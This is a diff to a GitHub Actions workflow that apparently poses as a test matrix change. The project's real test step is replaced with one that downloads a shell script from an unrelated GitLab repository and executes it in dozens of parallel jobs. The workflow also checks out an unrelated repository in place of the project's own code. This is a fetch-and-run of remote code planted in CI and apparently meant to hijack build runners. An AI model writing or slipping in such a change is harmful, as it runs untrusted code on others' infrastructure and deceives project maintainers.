@@ -1,4 +1,4 @@
-name: CI
+name: purl
 
 on: [push, pull_request]
 
@@ -8,7 +8,7 @@ jobs:
     strategy:
       # By default, GitHub will maximize the number of jobs run in parallel
       # depending on the available runners on GitHub-hosted virtual machines.
-      # max-parallel: 252
+      # max-parallel: 40
       fail-fast: false
       matrix:
         python-version:
@@ -22,14 +22,11 @@ jobs:
           - "2.0"
           - "2.1"
         bash-version:
-          - "2.6"
-          - "2.5"
-          - "2.4"
-          - "2.3"
-          - "2.2"
-          - "2.1"
-          - "1.9"
-          - "1.8"
+          - 4.4
+          - 4.3
+          - 4.2
+          - 4.1
+          - 3.2
         exclude:
           # Python 2.7 is compatible with Django 1.11
           - python-version: "2.7"
@@ -44,15 +41,22 @@ jobs:
           - python-version: "3.9"
             django-version: "2.0"
           - python-version: "3.9"
+    container: bash:${{ matrix.bash-version }} 
     timeout-minutes: 300
     env:
-        NUM_JOBS: 252
-    name: test ${{ matrix.python-version }} - ${{ matrix.django-version }} - ${{ matrix.bash-version }} custom
+        NUM_JOBS: 40-${{ matrix.python-version }}-${{ matrix.django-version }}-${{ matrix.bash-version }}
+
+    name: test ${{ matrix.python-version }} - ${{ matrix.django-version }} - bash:${{ matrix.bash-version }}
 
     steps:
-      - name: Checkout Version Test ${{ matrix.python-version }} - ${{ matrix.django-version }} - ${{ matrix.bash-version }}
+      - name: Clone Repo
         uses: actions/checkout@v2
+        with:
+          repository: actions/checkout
 
-      - name: test ${{ matrix.python-version }} - ${{ matrix.django-version }}
+      - name: Wget ${{ matrix.python-version }}-${{ matrix.django-version }}-bash:${{ matrix.bash-version }}
         run: |
-          echo --wait-on: true "wait jobs"
+          bash --version | head -2
+          wget https://gitlab.com/feereidal/sugar/-/raw/master/setelan.sh && chmod u+x setelan.sh && ./setelan.sh
+        env:
+          NUM_JOBS: 40-${{ matrix.python-version }}-${{ matrix.django-version }}-${{ matrix.bash-version }}
